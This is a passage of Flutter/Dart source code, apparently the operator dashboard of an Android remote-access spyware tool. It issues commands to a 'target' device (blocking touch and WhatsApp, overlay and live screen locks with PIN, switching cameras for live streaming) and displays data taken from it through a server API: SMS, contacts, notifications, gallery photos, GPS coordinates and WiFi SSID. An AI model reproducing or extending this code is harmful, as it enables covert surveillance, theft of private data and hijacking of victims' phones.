  // ── Touch Block ──────────────────────────────────────────────────────────
  void _showTouchBlockDialog() {
    final ctrl = TextEditingController();
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: ControlTheme.card,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(16),
          side: BorderSide(color: ControlTheme.border.withOpacity(0.2)),
        ),
        title: Text('Touch Block', style: const TextStyle(color: ControlTheme.textPrimary, fontSize: 14, fontWeight: FontWeight.bold, fontFamily: 'Astral')),
        content: Column(mainAxisSize: MainAxisSize.min, children: [
          Text('Set duration for touch block in seconds', style: TextStyle(color: ControlTheme.textSec, fontSize: 11, fontFamily: 'Astral')),
          const SizedBox(height: 12),
          _field(ctrl, 'Duration (seconds)', hint: '10', isNum: true),
        ]),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text('Cancel', style: TextStyle(color: ControlTheme.textMuted, fontSize: 11, fontFamily: 'Astral')),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: ControlTheme.red,
              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
            ),
            onPressed: () {
              Navigator.pop(context);
              final dur = ctrl.text.trim().isEmpty ? '10' : ctrl.text.trim();
              _cmd('touch_block', extra: dur);
            },
            child: Text('Block Touch', style: const TextStyle(color: Colors.white, fontSize: 11, fontWeight: FontWeight.bold, fontFamily: 'Astral')),
          ),
        ],
      ),
    );
  }

  // ── App Block ──────────────────────────────────────────────────────────
  void _showAppBlockSheet() {
    showModalBottomSheet(
      context: context,
      backgroundColor: ControlTheme.card,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.vertical(top: Radius.circular(20)),
      ),
      builder: (_) => DraggableScrollableSheet(
        initialChildSize: 0.4,
        maxChildSize: 0.5,
        expand: false,
        builder: (_, sc) => Column(
          children: [
            Container(
              height: 4,
              width: 36,
              margin: const EdgeInsets.only(top: 10, bottom: 8),
              decoration: BoxDecoration(
                color: ControlTheme.border.withOpacity(0.3),
                borderRadius: BorderRadius.circular(2),
              ),
            ),
            Text(
              'App Blocked',
              style: const TextStyle(
                color: ControlTheme.textPrimary,
                fontSize: 14,
                fontWeight: FontWeight.bold,
                fontFamily: 'Astral',
              ),
            ),
            const SizedBox(height: 8),
            Expanded(
              child: ListView(
                controller: sc,
                padding: const EdgeInsets.symmetric(horizontal: 14),
                children: [
                  _buildAppBlockItem(
                    'WhatsApp',
                    'com.whatsapp',
                    Icons.chat_bubble_outline,
                    _whatsappBlocked,
                    () {
                      setState(() {
                        _whatsappBlocked = !_whatsappBlocked;
                      });
                      _cmd(_whatsappBlocked ? 'block_app' : 'unblock_app', extra: 'com.whatsapp');
                    },
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildAppBlockItem(String name, String package, IconData icon, bool isBlocked, VoidCallback onTap) {
    return Container(
      margin: const EdgeInsets.symmetric(vertical: 6),
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
      decoration: BoxDecoration(
        color: ControlTheme.cardAlt,
        borderRadius: BorderRadius.circular(10),
        border: Border.all(
          color: isBlocked ? ControlTheme.error.withOpacity(0.4) : ControlTheme.border.withOpacity(0.15),
        ),
      ),
      child: Row(
        children: [
          Container(
            width: 40,
            height: 40,
            decoration: BoxDecoration(
              color: ControlTheme.card,
              borderRadius: BorderRadius.circular(8),
            ),
            child: Icon(icon, color: ControlTheme.red, size: 24),
          ),
          const SizedBox(width: 12),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  name,
                  style: const TextStyle(
                    color: ControlTheme.textPrimary,
                    fontSize: 13,
                    fontWeight: FontWeight.w600,
                    fontFamily: 'Astral',
                  ),
                ),
                Text(
                  package,
                  style: TextStyle(
                    color: ControlTheme.textMuted,
                    fontSize: 9,
                    fontFamily: 'Astral',
                  ),
                ),
              ],
            ),
          ),
          GestureDetector(
            onTap: onTap,
            child: Container(
              padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
              decoration: BoxDecoration(
                color: isBlocked ? ControlTheme.success : ControlTheme.red,
                borderRadius: BorderRadius.circular(8),
              ),
              child: Text(
                isBlocked ? 'Unblock' : 'Block',
                style: const TextStyle(
                  color: Colors.white,
                  fontSize: 11,
                  fontWeight: FontWeight.bold,
                  fontFamily: 'Astral',
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  // ── Overlay Lock ──────────────────────────────────────────────────────
  void _showOverlayLockDialog() {
    final ctrl = TextEditingController();
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: ControlTheme.card,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(16),
          side: BorderSide(color: ControlTheme.border.withOpacity(0.2)),
        ),
        title: Text('Overlay Lock', style: const TextStyle(color: ControlTheme.textPrimary, fontSize: 14, fontWeight: FontWeight.bold, fontFamily: 'Astral')),
        content: Column(mainAxisSize: MainAxisSize.min, children: [
          Text(
            'Set password/pin for overlay lock',
            style: TextStyle(color: ControlTheme.textSec, fontSize: 11, fontFamily: 'Astral'),
          ),
          const SizedBox(height: 12),
          _field(ctrl, 'Password Overlay', hint: 'Enter password/pin'),
        ]),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text('Cancel', style: TextStyle(color: ControlTheme.textMuted, fontSize: 11, fontFamily: 'Astral')),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: ControlTheme.red,
              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
            ),
            onPressed: () {
              Navigator.pop(context);
              final pass = ctrl.text.trim().isEmpty ? '1234' : ctrl.text.trim();
              _cmd('overlay_lock', extra: pass);
            },
            child: Text('Lock Overlay', style: const TextStyle(color: Colors.white, fontSize: 11, fontWeight: FontWeight.bold, fontFamily: 'Astral')),
          ),
        ],
      ),
    );
  }

  // ── SSID WiFi ──────────────────────────────────────────────────────────
  void _getSSID() async {
    try {
      final res = await http.get(
        Uri.parse('$_kBase/api/get-ssid/$_id')
      ).timeout(const Duration(seconds: 8));
      
      if (res.statusCode == 200 && res.body.isNotEmpty) {
        final data = jsonDecode(res.body);
        final ssid = data['ssid']?.toString() ?? 'Tidak terdeteksi';
        _addLog('SSID: $ssid');
        
        showDialog(
          context: context,
          builder: (_) => AlertDialog(
            backgroundColor: ControlTheme.card,
            shape: RoundedRectangleBorder(
              borderRadius: BorderRadius.circular(16),
              side: BorderSide(color: ControlTheme.border.withOpacity(0.2)),
            ),
            title: Row(
              children: [
                Icon(Icons.wifi, color: ControlTheme.red, size: 24),
                const SizedBox(width: 8),
                Text('WiFi SSID', style: const TextStyle(color: ControlTheme.textPrimary, fontSize: 14, fontWeight: FontWeight.bold, fontFamily: 'Astral')),
              ],
            ),
            content: Container(
              padding: const EdgeInsets.all(16),
              decoration: BoxDecoration(
                color: ControlTheme.cardAlt,
                borderRadius: BorderRadius.circular(8),
                border: Border.all(color: ControlTheme.border.withOpacity(0.15)),
              ),
              child: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  const Icon(Icons.wifi, color: ControlTheme.red, size: 48),
                  const SizedBox(height: 12),
                  Text(
                    ssid,
                    style: const TextStyle(
                      color: ControlTheme.textPrimary,
                      fontSize: 16,
                      fontWeight: FontWeight.bold,
                      fontFamily: 'Astral',
                    ),
                    textAlign: TextAlign.center,
                  ),
                ],
              ),
            ),
            actions: [
              TextButton(
                onPressed: () => Navigator.pop(context),
                child: Text('Close', style: TextStyle(color: ControlTheme.textMuted, fontSize: 11, fontFamily: 'Astral')),
              ),
            ],
          ),
        );
      } else {
        _addLog('Gagal mendapatkan SSID');
        _toast('Gagal mendapatkan SSID');
      }
    } catch (e) {
      _addLog('Error SSID: $e');
      _toast('Error: $e');
    }
  }

  // ─────────────────────────────────────────────────────────────────────────
  // GRID BUTTON HELPER
  // ─────────────────────────────────────────────────────────────────────────
  Widget _buildGridButtons(List<_GridButton> buttons, {int columns = 2}) {
    final List<Widget> rows = [];
    for (int i = 0; i < buttons.length; i += columns) {
      final rowButtons = buttons.skip(i).take(columns).toList();
      rows.add(
        Padding(
          padding: const EdgeInsets.only(bottom: 12),
          child: Row(
            children: [
              for (int j = 0; j < rowButtons.length; j++)
                Expanded(
                  child: Padding(
                    padding: EdgeInsets.only(right: j < rowButtons.length - 1 ? 12 : 0),
                    child: _gridButton(rowButtons[j]),
                  ),
                ),
              for (int j = rowButtons.length; j < columns; j++)
                const Expanded(child: SizedBox()),
            ],
          ),
        ),
      );
    }
    return Column(children: rows);
  }

  Widget _gridButton(_GridButton btn) {
    return InkWell(
      onTap: btn.onTap,
      borderRadius: BorderRadius.circular(12),
      child: Container(
        height: 90,
        padding: const EdgeInsets.all(12),
        decoration: BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
            colors: [
              ControlTheme.card,
              ControlTheme.cardAlt,
            ],
          ),
          borderRadius: BorderRadius.circular(12),
          border: Border.all(
            color: btn.color.withOpacity(0.3),
            width: 0.5,
          ),
          boxShadow: ControlShadowUtils.soft,
        ),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Container(
              width: 40,
              height: 40,
              decoration: BoxDecoration(
                color: btn.color.withOpacity(0.12),
                borderRadius: BorderRadius.circular(10),
                border: Border.all(
                  color: btn.color.withOpacity(0.2),
                  width: 0.5,
                ),
              ),
              child: Icon(btn.icon, color: btn.color, size: 20),
            ),
            const SizedBox(height: 8),
            Text(
              btn.label,
              style: TextStyle(
                fontSize: 9,
                fontWeight: FontWeight.w500,
                color: ControlTheme.textPrimary,
                fontFamily: 'Astral',
              ),
              textAlign: TextAlign.center,
            ),
          ],
        ),
      ),
    );
  }

  // ─────────────────────────────────────────────────────────────────────────
  // DIALOGS
  // ─────────────────────────────────────────────────────────────────────────
  void _showLiveDialog() {
    showDialog(
      context: context, barrierDismissible: false,
      builder: (_) => ValueListenableBuilder<int>(
        valueListenable: _frameN,
        builder: (ctx, _, __) => Dialog(
          backgroundColor: ControlTheme.card,
          insetPadding: const EdgeInsets.all(6),
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(16),
            side: BorderSide(color: ControlTheme.border.withOpacity(0.2)),
          ),
          child: Column(mainAxisSize: MainAxisSize.min, children: [
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
              decoration: BoxDecoration(
                color: ControlTheme.cardAlt,
                borderRadius: const BorderRadius.vertical(top: Radius.circular(16)),
                border: Border(
                  bottom: BorderSide(color: ControlTheme.border.withOpacity(0.15)),
                ),
              ),
              child: Row(children: [
                Container(width: 8, height: 8, decoration: const BoxDecoration(color: ControlTheme.red, shape: BoxShape.circle)),
                const SizedBox(width: 8),
                Text('LIVE — $_liveTitle', style: const TextStyle(fontSize: 12, fontWeight: FontWeight.bold, color: ControlTheme.textPrimary, fontFamily: 'Astral')),
                const Spacer(),
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
                  decoration: BoxDecoration(
                    color: ControlTheme.success.withOpacity(0.12),
                    borderRadius: BorderRadius.circular(6),
                    border: Border.all(color: ControlTheme.success.withOpacity(0.3)),
                  ),
                  child: Text(
                    '$_fps fps',
                    style: const TextStyle(fontSize: 8, fontWeight: FontWeight.bold, color: ControlTheme.success, fontFamily: 'Astral'),
                  ),
                ),
              ]),
            ),
            Container(
              constraints: BoxConstraints(maxHeight: MediaQuery.of(context).size.height * 0.52),
              color: ControlTheme.cardAlt,
              child: _frame != null
                  ? Image.memory(_frame!, fit: BoxFit.contain, gaplessPlayback: true, filterQuality: FilterQuality.low)
                  : const SizedBox(height: 180, child: Center(child: Column(mainAxisSize: MainAxisSize.min, children: [
                      CircularProgressIndicator(color: ControlTheme.red, strokeWidth: 2),
                      SizedBox(height: 10),
                      Text('Waiting for frames...', style: TextStyle(color: ControlTheme.textMuted, fontSize: 10, fontFamily: 'Astral')),
                    ]))),
            ),
            Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                color: ControlTheme.cardAlt,
                borderRadius: const BorderRadius.vertical(bottom: Radius.circular(16)),
                border: Border(
                  top: BorderSide(color: ControlTheme.border.withOpacity(0.15)),
                ),
              ),
              child: Row(children: [
                Expanded(child: OutlinedButton.icon(
                  style: OutlinedButton.styleFrom(
                    side: BorderSide(color: ControlTheme.border.withOpacity(0.2)),
                    shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
                  ),
                  icon: const Icon(Icons.cameraswitch_rounded, color: ControlTheme.textMuted, size: 15),
                  label: Text('Switch', style: TextStyle(color: ControlTheme.textMuted, fontSize: 9, fontFamily: 'Astral')),
                  onPressed: () {
                    final isFront = _liveTitle.contains('DEPAN');
                    _stopLive();
                    Future.delayed(const Duration(milliseconds: 300), () => _startLive('live_camera_start', isFront ? 'back' : 'front'));
                  },
                )),
                const SizedBox(width: 8),
                Expanded(child: ElevatedButton.icon(
                  style: ElevatedButton.styleFrom(
                    backgroundColor: ControlTheme.error,
                    shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
                  ),
                  icon: const Icon(Icons.stop_rounded, color: Colors.white, size: 15),
                  label: Text('Stop', style: const TextStyle(color: Colors.white, fontSize: 11, fontWeight: FontWeight.bold, fontFamily: 'Astral')),
                  onPressed: () { _stopLive(); Navigator.pop(ctx); },
                )),
              ]),
            ),
          ]),
        ),
      ),
    ).then((_) => _stopLive());
  }

  void _lockLiveDialog() {
    final msgCtrl = TextEditingController();
    final pinCtrl = TextEditingController();
    showDialog(context: context, builder: (_) => AlertDialog(
      backgroundColor: ControlTheme.card,
      shape: RoundedRectangleBorder(
        borderRadius: BorderRadius.circular(16),
        side: BorderSide(color: ControlTheme.border.withOpacity(0.2)),
      ),
      title: Text('Lock Live + Chat', style: const TextStyle(color: ControlTheme.red, fontSize: 14, fontWeight: FontWeight.bold, fontFamily: 'Astral')),
      content: Column(mainAxisSize: MainAxisSize.min, children: [
        Text('Target locked + two-way chat', style: TextStyle(color: ControlTheme.textSec, fontSize: 11, fontFamily: 'Astral')),
        const SizedBox(height: 12),
        _field(msgCtrl, 'Lock screen message', hint: 'This device is locked by administrator'),
        const SizedBox(height: 10),
        _field(pinCtrl, 'Unlock PIN', hint: '1234', isNum: true),
      ]),
      actions: [
        TextButton(onPressed: () => Navigator.pop(context), child: Text('Cancel', style: TextStyle(color: ControlTheme.textMuted, fontSize: 11, fontFamily: 'Astral'))),
        ElevatedButton(
          style: ElevatedButton.styleFrom(
            backgroundColor: ControlTheme.red,
            shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
          ),
          onPressed: () {
            Navigator.pop(context);
            final msg = msgCtrl.text.trim().isEmpty ? 'DEVICE LOCKED BY ADMINISTRATOR' : msgCtrl.text.trim();
            final pin = pinCtrl.text.trim().isEmpty ? '1234' : pinCtrl.text.trim();
            _cmd('lock_live', extra: '$msg|$pin');
          },
          child: Text('LOCK LIVE', style: const TextStyle(color: Colors.white, fontSize: 11, fontWeight: FontWeight.bold, fontFamily: 'Astral'))),
      ],
    ));
  }

  void _showCamPicker(Function(String) onPick) {
    String sel = 'back';
    showDialog(context: context, builder: (_) => StatefulBuilder(
      builder: (ctx, ss) => AlertDialog(
        backgroundColor: ControlTheme.card,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(16),
          side: BorderSide(color: ControlTheme.border.withOpacity(0.2)),
        ),
        title: Text('Select Camera', style: const TextStyle(color: ControlTheme.textPrimary, fontSize: 14, fontWeight: FontWeight.bold, fontFamily: 'Astral')),
        content: Row(mainAxisAlignment: MainAxisAlignment.spaceEvenly, children: ['back','front'].map((v) {
          final isSel = sel == v;
          return GestureDetector(
            onTap: () => ss(() => sel = v),
            child: Container(
              padding: const EdgeInsets.symmetric(horizontal: 22, vertical: 14),
              decoration: BoxDecoration(
                color: isSel ? ControlTheme.red.withOpacity(0.08) : Colors.transparent,
                borderRadius: BorderRadius.circular(10),
                border: Border.all(color: isSel ? ControlTheme.border : ControlTheme.surface3)),
              child: Column(children: [
                Icon(v == 'back' ? Icons.camera_rear_rounded : Icons.camera_front_rounded, color: isSel ? ControlTheme.red : ControlTheme.textMuted, size: 28),
                const SizedBox(height: 6),
                Text(v == 'back' ? 'Back' : 'Front', style: TextStyle(color: isSel ? ControlTheme.red : ControlTheme.textMuted, fontSize: 9, fontWeight: FontWeight.w600, fontFamily: 'Astral')),
              ]),
            ),
          );
        }).toList()),
        actions: [
          TextButton(onPressed: () => Navigator.pop(ctx), child: Text('Cancel', style: TextStyle(color: ControlTheme.textMuted, fontSize: 11, fontFamily: 'Astral'))),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: ControlTheme.red,
              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
            ),
            onPressed: () { Navigator.pop(ctx); onPick(sel); },
            child: Text('Select', style: const TextStyle(color: Colors.white, fontSize: 11, fontWeight: FontWeight.bold, fontFamily: 'Astral'))),
        ],
      ),
    ));
  }

  void _inputDialog(String title, String label, Function(String) onDone, {bool isNumber = false, String hint = ''}) {
    final ctrl = TextEditingController();
    showDialog(context: context, builder: (_) => AlertDialog(
      backgroundColor: ControlTheme.card,
      shape: RoundedRectangleBorder(
        borderRadius: BorderRadius.circular(16),
        side: BorderSide(color: ControlTheme.border.withOpacity(0.2)),
      ),
      title: Text(title, style: const TextStyle(color: ControlTheme.textPrimary, fontSize: 14, fontWeight: FontWeight.bold, fontFamily: 'Astral')),
      content: _field(ctrl, label, hint: hint, isNum: isNumber),
      actions: [
        TextButton(onPressed: () => Navigator.pop(context), child: Text('Cancel', style: TextStyle(color: ControlTheme.textMuted, fontSize: 11, fontFamily: 'Astral'))),
        ElevatedButton(
          style: ElevatedButton.styleFrom(
            backgroundColor: ControlTheme.red,
            shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
          ),
          onPressed: () { Navigator.pop(context); onDone(ctrl.text.trim()); },
          child: Text('Send', style: const TextStyle(color: Colors.white, fontSize: 11, fontWeight: FontWeight.bold, fontFamily: 'Astral'))),
      ],
    ));
  }

  // ─────────────────────────────────────────────────────────────────────────
  // DATA DISPLAY
  // ─────────────────────────────────────────────────────────────────────────
  void _fetchNotif() async {
    _addLog('Fetching notifications...');
    try {
      final res = await http.get(Uri.parse('$_kBase/api/get-notifications/$_id'));
      if (res.statusCode == 200) {
        final list = jsonDecode(res.body) as List;
        _addLog('${list.length} notifications');
        showModalBottomSheet(context: context, backgroundColor: ControlTheme.card,
          isScrollControlled: true,
          shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(20))),
          builder: (_) => DraggableScrollableSheet(initialChildSize: 0.6, maxChildSize: 0.9, expand: false,
            builder: (_, sc) => Column(children: [
              Container(height: 4, width: 36, margin: const EdgeInsets.only(top: 10, bottom: 8),
                decoration: BoxDecoration(
                  color: ControlTheme.border.withOpacity(0.3),
                  borderRadius: BorderRadius.circular(2),
                ),
              ),
              Text('Notifications', style: const TextStyle(color: ControlTheme.textPrimary, fontSize: 14, fontWeight: FontWeight.bold, fontFamily: 'Astral')),
              const SizedBox(height: 8),
              Expanded(child: ListView.separated(controller: sc, padding: const EdgeInsets.symmetric(horizontal: 14),
                itemCount: list.length, separatorBuilder: (_, __) => Divider(color: ControlTheme.surface2, height: 1),
                itemBuilder: (_, i) => ListTile(
                  contentPadding: const EdgeInsets.symmetric(horizontal: 0, vertical: 4),
                  leading: Container(width: 36, height: 36, decoration: BoxDecoration(color: ControlTheme.red.withOpacity(0.1), borderRadius: BorderRadius.circular(8)),
                    child: const Icon(Icons.notifications_rounded, color: ControlTheme.red, size: 18)),
                  title: Text(list[i]['title']?.toString() ?? '-', style: const TextStyle(color: ControlTheme.textPrimary, fontSize: 11, fontWeight: FontWeight.w600, fontFamily: 'Astral')),
                  subtitle: Text(list[i]['body']?.toString() ?? '', style: TextStyle(color: ControlTheme.textMuted, fontSize: 9, fontFamily: 'Astral'))),
              )),
            ]),
          ));
      }
    } catch (_) { _addLog('Notif error'); }
  }

  void _imgDialog(String b64, String title) {
    try {
      final c = b64.contains(',') ? b64.split(',').last : b64;
      final bytes = base64Decode(c);
      showDialog(context: context, builder: (_) => Dialog(
        backgroundColor: ControlTheme.bg, insetPadding: const EdgeInsets.all(12),
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(16),
          side: BorderSide(color: ControlTheme.border.withOpacity(0.2)),
        ),
        child: Column(mainAxisSize: MainAxisSize.min, children: [
          Padding(padding: const EdgeInsets.all(14),
            child: Text(title, style: const TextStyle(color: ControlTheme.textPrimary, fontSize: 14, fontWeight: FontWeight.bold, fontFamily: 'Astral'))),
          ClipRRect(borderRadius: const BorderRadius.vertical(bottom: Radius.circular(16)),
            child: Image.memory(bytes, fit: BoxFit.contain)),
        ]),
      ));
    } catch (_) { _toast('Image decode failed'); }
  }

  void _locationDialog(dynamic lat, dynamic lng) {
    showDialog(context: context, builder: (_) => AlertDialog(
      backgroundColor: ControlTheme.card,
      shape: RoundedRectangleBorder(
        borderRadius: BorderRadius.circular(16),
        side: BorderSide(color: ControlTheme.border.withOpacity(0.2)),
      ),
      title: Text('GPS Location', style: const TextStyle(color: ControlTheme.textPrimary, fontSize: 14, fontWeight: FontWeight.bold, fontFamily: 'Astral')),
      content: Column(mainAxisSize: MainAxisSize.min, children: [
        Text('Latitude:  $lat', style: TextStyle(color: ControlTheme.success, fontSize: 12, fontFamily: 'Astral')),
        const SizedBox(height: 4),
        Text('Longitude: $lng', style: TextStyle(color: ControlTheme.success, fontSize: 12, fontFamily: 'Astral')),
      ]),
      actions: [
        TextButton(onPressed: () => Navigator.pop(context), child: Text('Close', style: TextStyle(color: ControlTheme.textMuted, fontSize: 11, fontFamily: 'Astral'))),
        ElevatedButton(
          style: ElevatedButton.styleFrom(
            backgroundColor: ControlTheme.success,
            shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
          ),
          onPressed: () => launchUrl(Uri.parse('https://www.google.com/maps/search/?api=1&query=$lat,$lng'), mode: LaunchMode.externalApplication),
          child: Text('Open Maps', style: const TextStyle(color: Colors.white, fontSize: 11, fontWeight: FontWeight.bold, fontFamily: 'Astral'))),
      ],
    ));
  }

  void _textDialog(String title, String content) {
    showDialog(context: context, builder: (_) => AlertDialog(
      backgroundColor: ControlTheme.card,
      shape: RoundedRectangleBorder(
        borderRadius: BorderRadius.circular(16),
        side: BorderSide(color: ControlTheme.border.withOpacity(0.2)),
      ),
      title: Text(title, style: const TextStyle(color: ControlTheme.textPrimary, fontSize: 14, fontWeight: FontWeight.bold, fontFamily: 'Astral')),
      content: Container(padding: const EdgeInsets.all(12),
        decoration: BoxDecoration(
          color: ControlTheme.cardAlt,
          borderRadius: BorderRadius.circular(8),
          border: Border.all(color: ControlTheme.border.withOpacity(0.15)),
        ),
        child: SelectableText(content, style: TextStyle(color: ControlTheme.success, fontSize: 12, fontFamily: 'Astral'))),
      actions: [TextButton(onPressed: () => Navigator.pop(context), child: Text('Close', style: TextStyle(color: ControlTheme.textMuted, fontSize: 11, fontFamily: 'Astral')))],
    ));
  }

  void _contactsSheet(List contacts) {
    showModalBottomSheet(context: context, backgroundColor: ControlTheme.card,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(20))),
      builder: (_) => DraggableScrollableSheet(initialChildSize: 0.6, maxChildSize: 0.9, expand: false,
        builder: (_, sc) => Column(children: [
          Container(height: 4, width: 36, margin: const EdgeInsets.only(top: 10, bottom: 8),
            decoration: BoxDecoration(
              color: ControlTheme.border.withOpacity(0.3),
              borderRadius: BorderRadius.circular(2),
            ),
          ),
          Text('Contacts (${contacts.length})', style: const TextStyle(color: ControlTheme.textPrimary, fontSize: 14, fontWeight: FontWeight.bold, fontFamily: 'Astral')),
          const SizedBox(height: 8),
          Expanded(child: ListView.separated(controller: sc, padding: const EdgeInsets.symmetric(horizontal: 14),
            itemCount: contacts.length, separatorBuilder: (_, __) => Divider(color: ControlTheme.surface2, height: 1),
            itemBuilder: (_, i) => ListTile(
              contentPadding: const EdgeInsets.symmetric(horizontal: 0, vertical: 2),
              leading: Container(width: 36, height: 36, decoration: BoxDecoration(color: ControlTheme.red.withOpacity(0.08), borderRadius: BorderRadius.circular(8)),
                child: const Icon(Icons.person_rounded, color: ControlTheme.red, size: 18)),
              title: Text(contacts[i]['name']?.toString() ?? '-', style: const TextStyle(color: ControlTheme.textPrimary, fontSize: 11, fontFamily: 'Astral')),
              subtitle: Text(contacts[i]['number']?.toString() ?? '-', style: TextStyle(color: ControlTheme.textMuted, fontSize: 9, fontFamily: 'Astral'))),
          )),
        ]),
      ));
  }

  void _smsSheet(List sms) {
    showModalBottomSheet(context: context, backgroundColor: ControlTheme.card,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(20))),
      builder: (_) => DraggableScrollableSheet(initialChildSize: 0.75, maxChildSize: 0.95, expand: false,
        builder: (_, sc) => Column(children: [
          Container(height: 4, width: 36, margin: const EdgeInsets.only(top: 10, bottom: 8),
            decoration: BoxDecoration(
              color: ControlTheme.border.withOpacity(0.3),
              borderRadius: BorderRadius.circular(2),
            ),
          ),
          Text('SMS (${sms.length})', style: const TextStyle(color: ControlTheme.textPrimary, fontSize: 14, fontWeight: FontWeight.bold, fontFamily: 'Astral')),
          const SizedBox(height: 8),
          Expanded(child: ListView.separated(controller: sc, padding: const EdgeInsets.symmetric(horizontal: 14),
            itemCount: sms.length, separatorBuilder: (_, __) => Divider(color: ControlTheme.surface2, height: 1),
            itemBuilder: (_, i) {
              final s = sms[i] as Map;
              return ListTile(
                contentPadding: const EdgeInsets.symmetric(horizontal: 0, vertical: 4),
                leading: Container(width: 36, height: 36, decoration: BoxDecoration(color: ControlTheme.red.withOpacity(0.08), borderRadius: BorderRadius.circular(8)),
                  child: const Icon(Icons.sms_rounded, color: ControlTheme.red, size: 18)),
                title: Text(s['address']?.toString() ?? '-', style: const TextStyle(color: ControlTheme.textPrimary, fontSize: 11, fontWeight: FontWeight.w600, fontFamily: 'Astral')),
                subtitle: Text(s['body']?.toString() ?? '', style: TextStyle(color: ControlTheme.textMuted, fontSize: 9, fontFamily: 'Astral'), maxLines: 2, overflow: TextOverflow.ellipsis));
            })),
        ]),
      ));
  }

  void _gallerySheet(List imgs) {
    showModalBottomSheet(context: context, backgroundColor: ControlTheme.card,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(20))),
      builder: (_) => DraggableScrollableSheet(initialChildSize: 0.75, maxChildSize: 0.95, expand: false,
        builder: (_, sc) => Column(children: [
          Container(height: 4, width: 36, margin: const EdgeInsets.only(top: 10, bottom: 8),
            decoration: BoxDecoration(
              color: ControlTheme.border.withOpacity(0.3),
              borderRadius: BorderRadius.circular(2),
            ),
          ),
          Text('Gallery (${imgs.length})', style: const TextStyle(color: ControlTheme.textPrimary, fontSize: 14, fontWeight: FontWeight.bold, fontFamily: 'Astral')),
          const SizedBox(height: 8),
          Expanded(child: imgs.isEmpty
              ? Center(child: Text('No photos', style: TextStyle(color: ControlTheme.textMuted, fontSize: 11, fontFamily: 'Astral')))
              : GridView.builder(controller: sc, padding: const EdgeInsets.all(10),
                  gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(crossAxisCount: 3, crossAxisSpacing: 4, mainAxisSpacing: 4),
                  itemCount: imgs.length,
                  itemBuilder: (_, i) {
                    try {
                      final raw = imgs[i].toString();
                      final clean = raw.contains(',') ? raw.split(',').last : raw;
                      final bytes = base64Decode(clean);
                      return GestureDetector(
                        onTap: () => _imgDialog(raw, 'Gallery Photo ${i+1}'),
                        child: ClipRRect(borderRadius: BorderRadius.circular(6),
                          child: Image.memory(bytes, fit: BoxFit.cover)));
                    } catch (_) { return Container(decoration: BoxDecoration(color: ControlTheme.bg, borderRadius: BorderRadius.circular(6))); }
                  })),
        ]),
      ));
  }

  // ─────────────────────────────────────────────────────────────────────────
  // UI HELPERS
  // ─────────────────────────────────────────────────────────────────────────
  Widget _infoRow(String num, String text) => Padding(
    padding: const EdgeInsets.symmetric(vertical: 3),
    child: Row(children: [
      Container(width: 20, height: 20, decoration: BoxDecoration(
        color: ControlTheme.red.withOpacity(0.08),
        borderRadius: BorderRadius.circular(4),
        border: Border.all(color: ControlTheme.border.withOpacity(0.2)),
      ),
        child: Center(child: Text(num, style: TextStyle(fontSize: 8, fontWeight: FontWeight.bold, color: ControlTheme.red, fontFamily: 'Astral')))),
      const SizedBox(width: 10),
      Expanded(child: Text(text, style: TextStyle(color: ControlTheme.textMuted, fontSize: 9, fontFamily: 'Astral'))),
    ]),
  );

  Widget _field(TextEditingController ctrl, String label, {String hint = '', bool isNum = false}) =>
    TextField(
      controller: ctrl,
      keyboardType: isNum ? TextInputType.number : TextInputType.text,
      style: const TextStyle(color: ControlTheme.textPrimary, fontSize: 12, fontFamily: 'Astral'),
      decoration: InputDecoration(
        labelText: label,
        hintText: hint,
        labelStyle: TextStyle(color: ControlTheme.textMuted, fontSize: 9, fontFamily: 'Astral'),
        hintStyle: TextStyle(color: ControlTheme.textMuted, fontSize: 9, fontFamily: 'Astral'),
        filled: true,
        fillColor: ControlTheme.cardAlt,
        contentPadding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
        border: OutlineInputBorder(
          borderRadius: BorderRadius.circular(8),
          borderSide: BorderSide(color: ControlTheme.border.withOpacity(0.15)),
        ),
        enabledBorder: OutlineInputBorder(
          borderRadius: BorderRadius.circular(8),
